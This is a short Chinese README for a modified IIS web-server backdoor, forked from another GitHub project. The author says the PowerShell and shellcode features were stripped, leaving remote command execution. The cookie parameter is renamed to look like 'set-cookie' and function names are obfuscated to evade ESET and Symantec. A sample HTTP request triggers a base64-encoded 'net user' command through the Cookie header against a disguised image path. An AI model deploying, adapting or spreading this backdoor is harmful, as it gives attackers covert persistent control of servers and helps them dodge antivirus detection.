参考WBGlIl大佬项目，删除powershell和shellcode功能，只保留cmd功能

Cookie: cmd= 改成 Cookie: set-cookie=，对函数名进行混淆

目前已绕过 eset 和 symantec 

```
GET /aspnet_client/system_web/iisstart.png HTTP/2
Host: 192.168.42.128
Cookie: set-cookie=bmV0IHVzZXI=
```
---

参考WBGlIl大佬项目  
地址：https://github.com/WBGlIl/IIS_backdoor。

主要是实现了3个功能执行cmd命令，C#调用powershell，执行shellcode

其实文件上传也写了就是IIS_backdoor_shell项目没有添加对应的选项

因为Cookie大小限制是4096所以不能传输很大的文件，你也可以自行修改项目不使用Cookie传输数据

其实还有很多可以改进的地方不过我懒的写了暂时就这样吧

代码写的比较渣大佬误喷
